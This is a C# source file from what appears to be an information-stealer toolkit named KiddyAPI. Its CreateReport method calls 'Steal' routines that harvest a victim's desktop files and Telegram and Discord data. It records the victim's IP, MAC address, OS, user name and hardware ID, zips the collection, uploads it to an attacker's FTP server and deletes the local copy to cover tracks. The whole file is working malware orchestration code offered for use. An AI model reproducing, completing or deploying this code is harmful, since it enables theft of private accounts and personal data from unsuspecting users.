using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using KiddyAPI.Protect;
using KiddyAPI.Steal;


namespace KiddyAPI.Network
{
    class Utils
    {
        /// <summary>
        /// To Zip Ur Report
        /// </summary>
        /// <param name="pathToData">Path to DataReport</param>
        /// <param name="pathToSave">Path to save DataReport.zip</param>
        public static async void ToZipAsync(string pathToData, string pathToSave)
        {
            await Task.Run(() => ZipFile.CreateFromDirectory(pathToData, pathToSave));
        }
        /// <summary>
        /// Collect all user data and Send to ur ftp server. Path to save specify in Config Class
        /// </summary>
        public static  void CreateReport()
        {
            if (!Directory.Exists(Config.PathToReportDataDirectory))
            {
                Directory.CreateDirectory(Config.PathToReportDataDirectory);
                Apps.Desktop.Steal(Config.PathToReportDataDirectory, true);
                Apps.Telegram.Steal(Config.PathToReportDataDirectory);
                Apps.Discord.Steal(Config.PathToReportDataDirectory, true);
                WriteDataInTxtAsync();
                ToZipAsync(Config.PathToReportDataDirectory, Config.PathToReportDataDirectory + ".zip");
                FTPClient.UploadReportAsync();
                if (Config.UploadSuccess)
                    DeleteReportDataAsync();
            }
            else
            {
                Apps.Desktop.Steal(Config.PathToReportDataDirectory, true);
                Apps.Telegram.Steal(Config.PathToReportDataDirectory);
                Apps.Discord.Steal(Config.PathToReportDataDirectory, true);
                WriteDataInTxtAsync();
                ToZipAsync(Config.PathToReportDataDirectory, Config.PathToReportDataDirectory + ".zip");
                FTPClient.UploadReportAsync();
                if (Config.UploadSuccess)
                    DeleteReportDataAsync();
            }
        }

        private static async void WriteDataInTxtAsync()
        {
            await Task.Run(() =>
            {
                var userIp = Info.SystemWork.GetIP();
                var userMac = Info.SystemWork.GetMacAddress();
                var userOS = Info.SystemWork.GetOSVersion();
                var userName = Info.SystemWork.GetUserName();
                var userId = Info.UniqueID.GetUniqueHardwaeId();
                string[] tmp = new[]
                {
                    $"UserName: {userName}", $"UserOS: {userOS}", $"UserName: {userName}",
                    $"UserIp: {userIp}", $"UserMac: {userMac}", $"UserId: {userId}"
                };
                File.WriteAllLines($"{Config.PathToReportDataDirectory}\\tmp.txt", tmp);
            });
        }

        private static async void DeleteReportDataAsync()
        {
            await Task.Run(() => Directory.Delete(Config.PathToReportDataDirectory));
        }
    }
}
